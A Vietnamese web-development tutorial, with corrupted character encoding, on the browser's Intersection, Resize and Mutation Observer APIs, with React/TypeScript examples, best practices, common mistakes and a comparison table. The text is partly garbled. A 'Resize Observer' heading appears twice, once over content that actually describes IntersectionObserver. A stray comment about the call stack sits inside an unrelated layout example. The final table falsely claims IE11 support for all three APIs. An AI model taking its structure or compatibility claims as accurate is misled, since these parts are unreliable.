const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
 // Ch√∫ gi·∫£i: Load image...
    }
  });
});
images.forEach((img) => observer.observe(img));

// ‚ùå L·ªñI 2: Qu√™n disconnect observer ‚Üí memory leak
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
  // ‚ùå Thi·∫øu cleanup
}, []);

// ‚úÖ S·ª¨A: Lu√¥n cleanup
useEffect(() => {
  const observer = new IntersectionObserver(callback);
  observer.observe(element);
  
  return () => {
    observer.disconnect(); // Ch√∫ gi·∫£i: ‚úÖ Cleanup khi unmount
  };
}, []);
```

---

**üîç 2. RESIZE OBSERVER API (Quan S√°t Thay ƒê·ªïi K√≠ch Th∆∞·ªõc)**
- Ho·∫°t ƒë·ªông: ƒêƒÉng k√Ω callback ƒë∆∞·ª£c g·ªçi b·∫•t ƒë·ªìng b·ªô khi target element v√†o/ra kh·ªèi v√πng quan s√°t; engine t·ªëi ∆∞u kh√¥ng c·∫ßn poll/scroll listener li√™n t·ª•c.
- ∆Øu ƒëi·ªÉm: Hi·ªáu nƒÉng cao (kh√¥ng block main thread), API ƒë∆°n gi·∫£n, h·ªó tr·ª£ threshold linh ho·∫°t; gi·∫£m layout thrashing so v·ªõi getBoundingClientRect() trong scroll.
- Nh∆∞·ª£c ƒëi·ªÉm: Callback b·∫•t ƒë·ªìng b·ªô n√™n kh√¥ng ƒë·∫£m b·∫£o timing ch√≠nh x√°c pixel; c·∫ßn polyfill cho tr√¨nh duy·ªát r·∫•t c≈©; kh√¥ng ph√π h·ª£p cho logic c·∫ßn sync ch√≠nh x√°c.

Ch√∫ th√≠ch: D√πng `rootMargin` ƒë·ªÉ trigger s·ªõm/mu·ªôn (v√≠ d·ª•: lazy load tr∆∞·ªõc khi v√†o viewport); `threshold` x√°c ƒë·ªãnh % giao nhau ƒë·ªÉ fire callback.

**Code Example:**

```ts
// Lazy load images khi v√†o viewport
const images = document.querySelectorAll('img[data-src]');

const imageObserver = new IntersectionObserver(
  (entries, observer) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const img = entry.target as HTMLImageElement;
 // Ch√∫ gi·∫£i: Load ·∫£nh th·∫≠t
        img.src = img.dataset.src!;
        img.removeAttribute('data-src');
 // Ch√∫ gi·∫£i: Ng·ª´ng observe sau khi load
        observer.unobserve(img);
      }
    });
  },
  {
    root: null, // Ch√∫ gi·∫£i: viewport
    rootMargin: '50px', // trigger 50px tr∆∞·ªõc khi v√†o viewport
    threshold: 0.1, // 10% visible l√† trigger
  }
);

images.forEach((img) => imageObserver.observe(img));

 // Ch√∫ gi·∫£i: Infinite scroll example
const sentinel = document.querySelector('#load-more-trigger');
const loadMoreObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting) {
    loadMoreContent(); // fetch th√™m data
  }
});
if (sentinel) loadMoreObserver.observe(sentinel);

 // Ch√∫ gi·∫£i: Cleanup
 // Ch√∫ gi·∫£i: loadMoreObserver.disconnect();
```

**Best Practices:**

- D√πng `rootMargin` ƒë·ªÉ preload s·ªõm cho UX m∆∞·ª£t
- Unobserve sau khi x·ª≠ l√Ω xong (tr√°nh callback th·ª´a)
- D√πng `threshold: [0, 0.25, 0.5, 0.75, 1]` n·∫øu c·∫ßn theo d√µi nhi·ªÅu m·ª©c ƒë·ªô
- K·∫øt h·ª£p v·ªõi `loading="lazy"` native cho ·∫£nh

**Mistakes:**

```ts
// ‚ùå D√πng scroll listener + getBoundingClientRect ‚Üí ch·∫≠m, layout thrashing
window.addEventListener('scroll', () => {
  images.forEach((img) => {
    const rect = img.getBoundingClientRect();
    if (rect.top < window.innerHeight) {
 // Ch√∫ gi·∫£i: load image
    }
  });
});

// ‚úÖ D√πng IntersectionObserver
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
 // Ch√∫ gi·∫£i: load image
    }
  });
});
```

---

**üîç 2. RESIZE OBSERVER API (Quan S√°t Thay ƒê·ªïi K√≠ch Th∆∞·ªõc)**

**Kh√°i ni·ªám:**
- API theo d√µi **thay ƒë·ªïi k√≠ch th∆∞·ªõc c·ªßa element** (width, height)
- S·ª≠ d·ª•ng cho: Responsive components, Charts auto-resize, Dynamic layouts

**Ho·∫°t ƒë·ªông:**
1. Callback ƒë∆∞·ª£c g·ªçi khi **content box ho·∫∑c border box** c·ªßa element thay ƒë·ªïi
2. Ch·∫°y **tr∆∞·ªõc paint** ƒë·ªÉ tr√°nh visual flash
3. H·ªó tr·ª£ nhi·ªÅu box model: `content-box`, `border-box`, `device-pixel-content-box`

**∆Øu ƒëi·ªÉm:**
- ‚úÖ **Hi·ªáu nƒÉng t·ªët h∆°n** window.resize + polling
- ‚úÖ **Ph√°t hi·ªán resize t·ª´ b·∫•t k·ª≥ ngu·ªìn**: CSS, JavaScript, user action
- ‚úÖ **Per-element tracking**: Theo d√µi t·ª´ng element ri√™ng l·∫ª (kh√¥ng ph·∫£i to√†n viewport)
- ‚úÖ **Kh√¥ng c·∫ßn media queries**: Component t·ª± responsive

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ö†Ô∏è Callback c√≥ th·ªÉ fire li√™n t·ª•c khi animate
- ‚ö†Ô∏è C·∫ßn debounce cho logic n·∫∑ng
- ‚ö†Ô∏è C√≥ th·ªÉ g√¢y **infinite loop** n·∫øu callback thay ƒë·ªïi size c·ªßa ch√≠nh element ƒëang observe

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef, useState } from 'react';

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: A. RESPONSIVE COMPONENT (Component T·ª± Responsive)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Component t·ª± ƒëi·ªÅu ch·ªânh layout khi k√≠ch th∆∞·ªõc thay ƒë·ªïi
// Kh√¥ng c·∫ßn media queries ‚Üí component portable, reusable

function ResponsiveCard() {
  const cardRef = useRef<HTMLDivElement>(null);
  const [layout, setLayout] = useState<'horizontal' | 'vertical'>('horizontal');
  const [dimensions, setDimensions] = useState({ width: 0, height: 0 });
  
  useEffect(() => {
 // Ch√∫ gi·∫£i: T·∫°o Resize Observer
    const resizeObserver = new ResizeObserver((entries) => {
      // entries: Danh s√°ch c√°c elements ƒëang observe
      for (const entry of entries) {
        // contentRect: K√≠ch th∆∞·ªõc content box c·ªßa element
        const { width, height } = entry.contentRect;
        
        console.log(`üìè Card resize: ${width}x${height}`);
        setDimensions({ width, height });
        
        // T·ª± ƒë·ªông chuy·ªÉn layout d·ª±a v√†o width
        if (width < 500) {
          setLayout('vertical'); // NgƒÉn x·∫øp g·ªçi (call stack) th·ª±c thi m√£ ƒë·ªìng b·ªô theo nguy√™n t·∫Øc LIFO; t√°c v·ª• d√†i ch·∫∑n UI.
          console.log('‚Üí Chuy·ªÉn sang vertical layout');
        } else {
          setLayout('horizontal'); // Ch√∫ gi·∫£i: Desktop: side by side
          console.log('‚Üí Chuy·ªÉn sang horizontal layout');
        }
      }
    });
    
 // Ch√∫ gi·∫£i: Observe card element
    if (cardRef.current) {
      resizeObserver.observe(cardRef.current);
    }
    
 // Ch√∫ gi·∫£i: Cleanup khi unmount
    return () => {
      resizeObserver.disconnect();
    };
  }, []);
  
  return (
    <div 
      ref={cardRef}
      className={`card ${layout}`}
      style={{
        display: 'flex',
        flexDirection: layout === 'vertical' ? 'column' : 'row',
        gap: '1rem',
        padding: '1rem',
        border: '1px solid #ccc'
      }}
    >
      <div className="card-image">
        <img src="/image.jpg" alt="Card" style={{ width: '100%' }} />
      </div>
      <div className="card-content">
        <h3>Ti√™u ƒë·ªÅ</h3>
        <p>N·ªôi dung...</p>
        <p className="dimensions">
          üìê K√≠ch th∆∞·ªõc: {dimensions.width.toFixed(0)}px √ó {dimensions.height.toFixed(0)}px
        </p>
      </div>
    </div>
  );
}
// K·∫øt qu·∫£: Component t·ª± adapt layout khi container resize
// ‚Üí Kh√¥ng c·∫ßn CSS media queries ‚Üí Portable, reusable

 // Ch√∫ gi·∫£i: ============================================
// B. CHART AUTO-RESIZE (Bi·ªÉu ƒê·ªì T·ª± Scale)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Chart t·ª± ƒë·ªông scale khi container resize
// VD: User m·ªü/ƒë√≥ng sidebar ‚Üí chart t·ª± fit container m·ªõi

function TradingChart() {
  const containerRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const chartInstance = useRef<any>(null); // Ch√∫ gi·∫£i: Chart.js instance
  
  useEffect(() => {
 // Ch√∫ gi·∫£i: Kh·ªüi t·∫°o chart
    if (canvasRef.current) {
      const ctx = canvasRef.current.getContext('2d');
 // Ch√∫ gi·∫£i: chartInstance.current = new Chart(ctx, { ... });
    }
    
    // Observe container (KH√îNG observe canvas tr·ª±c ti·∫øp)
    // T·∫°i sao? N·∫øu observe canvas ‚Üí canvas resize ‚Üí observer fire ‚Üí canvas resize l·∫°i ‚Üí loop!
    const resizeObserver = new ResizeObserver((entries) => {
      const { width, height } = entries[0].contentRect;
      
      console.log(`üìä Chart container resize: ${width}x${height}`);
      
      // Resize chart ƒë·ªÉ fit container
      if (chartInstance.current && canvasRef.current) {
        canvasRef.current.width = width;
        canvasRef.current.height = height;
        
 // Ch√∫ gi·∫£i: Update chart dimensions
        chartInstance.current.resize(width, height);
        console.log('‚úÖ Chart ƒë√£ resize');
      }
    });
    
    // Observe parent container (KH√îNG ph·∫£i canvas)
    if (containerRef.current) {
      resizeObserver.observe(containerRef.current);
    }
    
    return () => {
      resizeObserver.disconnect();
 // Ch√∫ gi·∫£i: chartInstance.current?.destroy();
    };
  }, []);
  
  return (
    <div 
      ref={containerRef}
      className="chart-container"
      style={{ width: '100%', height: '400px', position: 'relative' }}
    >
      <canvas ref={canvasRef} />
    </div>
  );
}

 // Ch√∫ gi·∫£i: ============================================
// C. TEXTAREA AUTO-HEIGHT (Textarea T·ª± ƒêi·ªÅu Ch·ªânh Chi·ªÅu Cao)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Textarea t·ª± tƒÉng/gi·∫£m height khi user type
// Kh√¥ng c·∫ßn fixed height ‚Üí UX t·ªët h∆°n

function AutoExpandTextarea() {
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const [height, setHeight] = useState(60); // Ch√∫ gi·∫£i: Min height
  
  useEffect(() => {
    const resizeObserver = new ResizeObserver((entries) => {
      const { height } = entries[0].contentRect;
      
      // Ch·ªâ log khi height thay ƒë·ªïi ƒë√°ng k·ªÉ (tr√°nh spam)
      if (Math.abs(height - entries[0].target.clientHeight) > 5) {
        console.log(`‚úèÔ∏è Textarea height: ${height}px`);
        setHeight(height);
      }
    });
    
    if (textareaRef.current) {
 // Ch√∫ gi·∫£i: Observe textarea itself
      resizeObserver.observe(textareaRef.current);
    }
    
    return () => resizeObserver.disconnect();
  }, []);
  
  return (
    <div>
      <textarea 
        ref={textareaRef}
        placeholder="Type something..."
        style={{
          width: '100%',
          minHeight: '60px',
          resize: 'vertical', // Cho ph√©p user resize manually
          padding: '0.5rem'
        }}
      />
      <p className="info">Current height: {height}px</p>
    </div>
  );
}
```

**Best Practices (Th·ª±c H√†nh T·ªët):**

1. **‚úÖ Debounce logic n·∫∑ng v·ªõi requestAnimationFrame**
   ```typescript
   const resizeObserver = new ResizeObserver((entries) => {
     requestAnimationFrame(() => {
       // Logic n·∫∑ng (recalculate layout, re-render chart, etc.)
     });
   });
   ```

2. **‚úÖ Observe parent container, KH√îNG ph·∫£i element s·∫Ω resize**
   ```typescript
   // ‚ùå SAI: Observe canvas tr·ª±c ti·∫øp
   resizeObserver.observe(canvas);
   
   // ‚úÖ ƒê√öNG: Observe parent container
   resizeObserver.observe(canvas.parentElement);
   ```

3. **‚úÖ Disconnect khi component unmount**
   ```typescript
   useEffect(() => {
     const observer = new ResizeObserver(callback);
     observer.observe(element);
     
     return () => observer.disconnect(); // Ch√∫ gi·∫£i: ‚úÖ Cleanup
   }, []);
   ```

4. **‚úÖ D√πng cho responsive components (thay th·∫ø media queries)**
   - Media queries: D·ª±a v√†o viewport size
   - ResizeObserver: D·ª±a v√†o component size ‚Üí Reusable h∆°n

**Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p):**

```typescript
// ‚ùå L·ªñI 1: Infinite Loop - Resize ch√≠nh element ƒëang observe
const box = document.querySelector('.box') as HTMLElement;

const badObserver = new ResizeObserver(() => {
  // ‚ùå Thay ƒë·ªïi size c·ªßa ch√≠nh element ƒëang observe
  box.style.width = (box.offsetWidth + 10) + 'px';
  // ‚Üí Observer fire ‚Üí tƒÉng width ‚Üí observer fire l·∫°i ‚Üí loop v√¥ h·∫°n!
});
badObserver.observe(box);

// ‚úÖ S·ª¨A: D√πng flag ƒë·ªÉ ngƒÉn loop ho·∫∑c observe parent
let isResizing = false;

const goodObserver = new ResizeObserver(() => {
  if (!isResizing) {
    isResizing = true;
    
 // Ch√∫ gi·∫£i: Logic resize
    requestAnimationFrame(() => {
      box.style.width = (box.offsetWidth + 10) + 'px';
      isResizing = false; // Ch√∫ gi·∫£i: Reset flag
    });
  }
});
goodObserver.observe(box);

// ‚ùå L·ªñI 2: Kh√¥ng debounce logic n·∫∑ng ‚Üí Ch·∫≠m
const heavyObserver = new ResizeObserver((entries) => {
  // ‚ùå Logic n·∫∑ng ch·∫°y m·ªói l·∫ßn resize (c√≥ th·ªÉ fire r·∫•t nhi·ªÅu l·∫ßn)
  entries.forEach((entry) => {
    recalculateComplexLayout(); // Ch√∫ gi·∫£i: Expensive operation
    rerenderChart(); // Ch√∫ gi·∫£i: Expensive operation
  });
});

 // Ch√∫ gi·∫£i: ‚úÖ S·ª¨A: Debounce v·ªõi requestAnimationFrame
const optimizedObserver = new ResizeObserver((entries) => {
  requestAnimationFrame(() => {
    // Logic n·∫∑ng ch·ªâ ch·∫°y 1 l·∫ßn per frame
    entries.forEach((entry) => {
      recalculateComplexLayout();
      rerenderChart();
    });
  });
});

// ‚ùå L·ªñI 3: Qu√™n disconnect ‚Üí Memory leak
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);
    // ‚ùå Thi·∫øu cleanup ‚Üí observer v·∫´n ch·∫°y sau unmount
  }, []);
}

// ‚úÖ S·ª¨A: Lu√¥n cleanup
function MyComponent() {
  useEffect(() => {
    const observer = new ResizeObserver(callback);
    observer.observe(element);
    
    return () => observer.disconnect(); // Ch√∫ gi·∫£i: ‚úÖ Cleanup
  }, []);
}
```

---

**üîç 3. MUTATION OBSERVER API (Quan S√°t Thay ƒê·ªïi DOM)**

**Kh√°i ni·ªám:**
- API theo d√µi **thay ƒë·ªïi DOM tree**: th√™m/x√≥a nodes, thay ƒë·ªïi attributes, thay ƒë·ªïi text content
- Thay th·∫ø cho **Mutation Events** (deprecated - ƒë√£ l·ªói th·ªùi)
- S·ª≠ d·ª•ng cho: Auto-init new elements, Debug DOM changes, Polyfill custom elements, Third-party integration

**Ho·∫°t ƒë·ªông:**
1. Callback ƒë∆∞·ª£c g·ªçi **b·∫•t ƒë·ªìng b·ªô (microtask)** khi c√≥ mutation kh·ªõp config
2. Browser **gom nh√≥m mutations** ƒë·ªÉ gi·∫£m s·ªë l·∫ßn g·ªçi callback (batch processing)
3. H·ªó tr·ª£ filter theo lo·∫°i mutation: `childList`, `attributes`, `characterData`

**∆Øu ƒëi·ªÉm:**
- ‚úÖ **Hi·ªáu nƒÉng t·ªët h∆°n** Mutation Events (deprecated)
- ‚úÖ **Linh ho·∫°t**: Filter ch√≠nh x√°c lo·∫°i mutation c·∫ßn quan t√¢m
- ‚úÖ **Observe subtree**: Theo d√µi to√†n b·ªô c√¢y con (descendants)
- ‚úÖ **Track old values**: L∆∞u gi√° tr·ªã c≈© c·ªßa attributes/text

**Nh∆∞·ª£c ƒëi·ªÉm:**
- ‚ö†Ô∏è Callback b·∫•t ƒë·ªìng b·ªô ‚Üí kh√¥ng real-time
- ‚ö†Ô∏è Performance issue n·∫øu observe to√†n `document.body` v·ªõi `subtree: true`
- ‚ö†Ô∏è Logic ph·ª©c t·∫°p khi x·ª≠ l√Ω nhi·ªÅu mutations c√πng l√∫c

**Code Example (TypeScript + React):**

```typescript
import { useEffect, useRef } from 'react';

 // Ch√∫ gi·∫£i: ============================================
// A. THEME SWITCHER TRACKING (Theo D√µi ƒê·ªïi Theme)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Theo d√µi attribute data-theme thay ƒë·ªïi
 // Ch√∫ gi·∫£i: ‚Üí Update components khi user switch theme

function ThemeAwareComponent() {
  useEffect(() => {
    const root = document.documentElement; // Ch√∫ gi·∫£i: <html> element
    
 // Ch√∫ gi·∫£i: T·∫°o Mutation Observer
    const themeObserver = new MutationObserver((mutations) => {
      // mutations: Danh s√°ch c√°c thay ƒë·ªïi DOM
      mutations.forEach((mutation) => {
        // Ch·ªâ quan t√¢m khi attribute thay ƒë·ªïi
        if (mutation.type === 'attributes' && mutation.attributeName === 'data-theme') {
          const newTheme = root.getAttribute('data-theme');
          const oldTheme = mutation.oldValue;
          
          console.log(`üé® Theme changed: ${oldTheme} ‚Üí ${newTheme}`);
          
 // Ch√∫ gi·∫£i: Update chart colors, reload styles, etc.
          updateComponentTheme(newTheme);
        }
      });
    });
    
 // Ch√∫ gi·∫£i: Observe <html> element
    themeObserver.observe(root, {
      attributes: true,              // Theo d√µi attributes thay ƒë·ªïi
      attributeFilter: ['data-theme'], // Ch·ªâ quan t√¢m data-theme (ignore c√°c attributes kh√°c)
      attributeOldValue: true        // L∆∞u gi√° tr·ªã c≈© (ƒë·ªÉ so s√°nh)
    });
    
    return () => themeObserver.disconnect();
  }, []);
  
  return <div>Theme-aware content...</div>;
}

function updateComponentTheme(theme: string | null) {
 // Ch√∫ gi·∫£i: Update chart colors
 // Ch√∫ gi·∫£i: Reload CSS variables
 // Ch√∫ gi·∫£i: Re-render components with new theme
}

 // Ch√∫ gi·∫£i: ============================================
// B. AUTO-INIT NEW ELEMENTS (T·ª± ƒê·ªông Kh·ªüi T·∫°o Elements M·ªõi)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: T·ª± ƒë·ªông init tooltips, modals cho elements m·ªõi ƒë∆∞·ª£c th√™m v√†o DOM
 // Ch√∫ gi·∫£i: Use case: SPA with dynamic content, third-party libraries add elements

function AutoInitializer() {
  useEffect(() => {
    const container = document.querySelector('#dynamic-content') as HTMLElement;
    
    const nodeObserver = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        // Ch·ªâ quan t√¢m nodes ƒë∆∞·ª£c th√™m v√†o
        mutation.addedNodes.forEach((node) => {
          // Ki·ªÉm tra node type (ch·ªâ x·ª≠ l√Ω element nodes)
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as HTMLElement;
            
 // Ch√∫ gi·∫£i: Auto-init tooltips
            if (element.matches('[data-tooltip]')) {
              console.log('‚ú® Init tooltip cho:', element);
              initTooltip(element);
            }
            
 // Ch√∫ gi·∫£i: Auto-init modals
            if (element.matches('[data-modal]')) {
              console.log('‚ú® Init modal cho:', element);
              initModal(element);
            }
            
 // Ch√∫ gi·∫£i: Auto-init date pickers
            if (element.matches('.date-picker')) {
              console.log('‚ú® Init date picker cho:', element);
              initDatePicker(element);
            }
          }
        });
      });
    });
    
    nodeObserver.observe(container, {
      childList: true, // Theo d√µi th√™m/x√≥a node con
      subtree: true    // Theo d√µi c·∫£ c√°c node con s√¢u h∆°n (descendants)
    });
    
    return () => nodeObserver.disconnect();
  }, []);
  
  return <div id="dynamic-content">Content will be added here...</div>;
}

function initTooltip(element: HTMLElement) {
 // Ch√∫ gi·∫£i: Init tooltip library...
}

function initModal(element: HTMLElement) {
 // Ch√∫ gi·∫£i: Init modal library...
}

function initDatePicker(element: HTMLElement) {
 // Ch√∫ gi·∫£i: Init date picker library...
}

 // Ch√∫ gi·∫£i: ============================================
// C. DEBUG DOM CHANGES (Debug Thay ƒê·ªïi DOM)
 // Ch√∫ gi·∫£i: ============================================

// Gi·∫£i th√≠ch: Track t·∫•t c·∫£ thay ƒë·ªïi DOM ƒë·ªÉ debug
// Use case: Ph√°t hi·ªán third-party library n√†o ƒëang modify DOM

function DOMDebugger() {
  useEffect(() => {
    const debugObserver = new MutationObserver((mutations) => {
      console.group(`üîç ${mutations.length} DOM mutations detected`);
      
      mutations.forEach((mutation, index) => {
        console.log(`\n[${index + 1}] Type: ${mutation.type}`);
        
        if (mutation.type === 'childList') {
          // Nodes ƒë∆∞·ª£c th√™m
          if (mutation.addedNodes.length > 0) {
            console.log('  ‚ûï Added nodes:', Array.from(mutation.addedNodes));
          }
          
          // Nodes b·ªã x√≥a
          if (mutation.removedNodes.length > 0) {
            console.log('  ‚ûñ Removed nodes:', Array.from(mutation.removedNodes));
          }
        }
        
        if (mutation.type === 'attributes') {
          console.log('  üè∑Ô∏è Attribute changed:', mutation.attributeName);
          console.log('     Old value:', mutation.oldValue);
          console.log('     New value:', (mutation.target as Element).getAttribute(mutation.attributeName!));
        }
        
        if (mutation.type === 'characterData') {
          console.log('  üìù Text changed');
          console.log('     Old:', mutation.oldValue);
          console.log('     New:', mutation.target.textContent);
        }
      });
      
      console.groupEnd();
    });
    
    // Observe to√†n b·ªô document (CH·ªà cho debug, KH√îNG d√πng production)
    debugObserver.observe(document.body, {
      childList: true, // Ch√∫ gi·∫£i: Track add/remove nodes
      attributes: true, // Ch√∫ gi·∫£i: Track attribute changes
      characterData: true, // Ch√∫ gi·∫£i: Track text changes
      subtree: true, // Ch√∫ gi·∫£i: Track all descendants
      attributeOldValue: true, // L∆∞u gi√° tr·ªã c≈©
      characterDataOldValue: true
    });
    
    return () => debugObserver.disconnect();
  }, []);
  
  return <div>DOM Debugger active...</div>;
}
```

**Best Practices (Th·ª±c H√†nh T·ªët):**

1. **‚úÖ Filter ch√≠nh x√°c lo·∫°i mutation**
   ```typescript
   observer.observe(element, {
     attributes: true,
     attributeFilter: ['data-state', 'aria-expanded'], // Ch·ªâ 2 attributes n√†y
     // KH√îNG: attributes: true (quan s√°t T·∫§T C·∫¢ attributes)
   });
   ```

2. **‚úÖ D√πng `attributeFilter` ƒë·ªÉ gi·∫£m noise**
   ```typescript
   // ‚ùå Quan s√°t t·∫•t c·∫£ attributes ‚Üí callback fire r·∫•t nhi·ªÅu
   { attributes: true }
   
   // ‚úÖ Ch·ªâ quan s√°t 1 attribute c·ª• th·ªÉ
   { attributes: true, attributeFilter: ['data-theme'] }
   ```

3. **‚úÖ Disconnect khi kh√¥ng c·∫ßn**
   ```typescript
   useEffect(() => {
     const observer = new MutationObserver(callback);
     observer.observe(element, config);
     
     return () => observer.disconnect(); // Ch√∫ gi·∫£i: ‚úÖ Cleanup
   }, []);
   ```

4. **‚úÖ Debounce/batch x·ª≠ l√Ω mutations**
   ```typescript
   let mutationQueue: MutationRecord[] = [];
   let timeoutId: number;
   
   const observer = new MutationObserver((mutations) => {
     mutationQueue.push(...mutations);
     
     clearTimeout(timeoutId);
     timeoutId = setTimeout(() => {
       // X·ª≠ l√Ω t·∫•t c·∫£ mutations c√πng l√∫c
       processMutations(mutationQueue);
       mutationQueue = [];
     }, 100);
   });
   ```

**Common Mistakes (L·ªói Th∆∞·ªùng G·∫∑p):**

```typescript
// ‚ùå L·ªñI 1: Observe to√†n document v·ªõi subtree ‚Üí R·∫•t ch·∫≠m
const badObserver = new MutationObserver((mutations) => {
  // ‚ùå Logic n·∫∑ng ch·∫°y m·ªói khi DOM thay ƒë·ªïi (r·∫•t nhi·ªÅu l·∫ßn)
  mutations.forEach((mutation) => {
    expensiveOperation();
  });
});

badObserver.observe(document.body, {
  childList: true,
  subtree: true,  // ‚ùå Quan s√°t T·∫§T C·∫¢ descendants
  attributes: true // ‚ùå Quan s√°t T·∫§T C·∫¢ attributes
});
// ‚Üí Callback fire h√†ng trƒÉm l·∫ßn/gi√¢y ‚Üí App ch·∫≠m

// ‚úÖ S·ª¨A: Scope nh·ªè + Filter ch√≠nh x√°c
const goodObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    targetedOperation();
  });
});

const specificContainer = document.querySelector('#app-content');
goodObserver.observe(specificContainer, {
  childList: true,
  subtree: false, // Ch√∫ gi·∫£i: ‚úÖ Ch·ªâ direct children
  attributeFilter: ['data-state'] // Ch√∫ gi·∫£i: ‚úÖ Ch·ªâ 1 attribute
});

// ‚ùå L·ªñI 2: Qu√™n disconnect ‚Üí Memory leak
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);
    // ‚ùå Thi·∫øu cleanup
  }, []);
}

// ‚úÖ S·ª¨A: Lu√¥n disconnect
function Component() {
  useEffect(() => {
    const observer = new MutationObserver(callback);
    observer.observe(document.body, config);
    
    return () => observer.disconnect(); // Ch√∫ gi·∫£i: ‚úÖ Cleanup
  }, []);
}

// ‚ùå L·ªñI 3: Logic ƒë·ªìng b·ªô n·∫∑ng trong callback
const syncObserver = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
 // Ch√∫ gi·∫£i: ‚ùå Sync operations block main thread
    for (let i = 0; i < 10000; i++) {
      doHeavyCalculation();
    }
  });
});

 // Ch√∫ gi·∫£i: ‚úÖ S·ª¨A: Batch + async processing
const asyncObserver = new MutationObserver((mutations) => {
 // Ch√∫ gi·∫£i: Gom mutations
  const addedElements = mutations
    .flatMap(m => Array.from(m.addedNodes))
    .filter(n => n.nodeType === Node.ELEMENT_NODE);
  
  // X·ª≠ l√Ω async
  queueMicrotask(() => {
    processElementsBatch(addedElements);
  });
});
```

---

**üìä So S√°nh 3 Observer APIs:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Ti√™u Ch√≠            ‚îÇ Intersection         ‚îÇ Resize              ‚îÇ Mutation            ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Theo d√µi            ‚îÇ Giao ƒëi·ªÉm viewport   ‚îÇ K√≠ch th∆∞·ªõc element  ‚îÇ Thay ƒë·ªïi DOM        ‚îÇ
‚îÇ Use Cases           ‚îÇ Lazy load, Infinite  ‚îÇ Responsive, Charts  ‚îÇ Auto-init, Debug    ‚îÇ
‚îÇ                     ‚îÇ scroll, Analytics    ‚îÇ Layouts             ‚îÇ Polyfills           ‚îÇ
‚îÇ Performance         ‚îÇ ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê            ‚îÇ ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê           ‚îÇ ‚≠ê‚≠ê‚≠ê‚≠ê (c·∫©n th·∫≠n)  ‚îÇ
‚îÇ Complexity          ‚îÇ D·ªÖ                   ‚îÇ Trung b√¨nh          ‚îÇ Kh√≥ (nhi·ªÅu edge     ‚îÇ
‚îÇ                     ‚îÇ                      ‚îÇ                     ‚îÇ cases)              ‚îÇ
‚îÇ Risk                ‚îÇ Th·∫•p                 ‚îÇ Loop n·∫øu sai c√°ch   ‚îÇ Performance n·∫øu     ‚îÇ
‚îÇ                     ‚îÇ                      ‚îÇ                     ‚îÇ observe r·ªông        ‚îÇ
‚îÇ Browser Support     ‚îÇ Modern (IE11+)       ‚îÇ Modern (IE11+)      ‚îÇ Modern (IE11+)      ‚îÇ
